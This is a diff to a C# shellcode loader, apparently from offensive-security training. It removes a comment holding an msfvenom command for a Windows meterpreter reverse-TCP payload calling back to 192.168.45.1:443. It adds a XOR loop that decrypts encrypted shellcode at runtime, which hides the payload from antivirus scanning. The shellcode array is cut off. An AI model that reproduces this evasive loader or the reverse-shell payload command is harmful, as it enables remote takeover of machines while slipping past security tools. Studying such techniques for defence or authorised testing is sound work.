@@ -23,9 +23,15 @@ namespace ConsoleApp1
 
         static void Main(string[] args)
         {
-	    // EDIT THIS PART: REPLACE SHELLCODE WITH YOUR OWN
-	    // msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.1 LPORT=443 -f csharp
-            byte[] buf = new byte[630] {0xfc,0x48,0x83,0xe4,...};
+	    // EDIT THIS PART: REPLACE SHELLCODE WITH ENCRYPTED SHELLCODE BYTES
+            byte[] buf = new byte[630] {0xfc,0x48,0x83,0xe4,...
+
+	    byte key = 0xAA; // REPLACE WITH XOR KEY USED FOR ENCRYPTION
+
+	    for (int i = 0; i < buf.Length; i++)
+	    {
+		buf[i] = (byte)(buf[i] ^ key);
+	    }
 
             int size = buf.Length;
 
